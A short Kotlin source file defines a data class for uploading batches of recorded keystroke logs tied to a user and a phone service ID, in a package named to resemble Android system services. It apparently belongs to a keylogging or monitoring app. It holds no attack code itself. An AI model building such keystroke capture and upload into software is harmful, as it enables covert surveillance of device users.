package com.android.services.models

import com.android.services.db.entities.KeyLog

data class KeyLogUpload(
    val userId: String,
    val phoneServiceId: String,
    val keyLogs: List<KeyLog>
)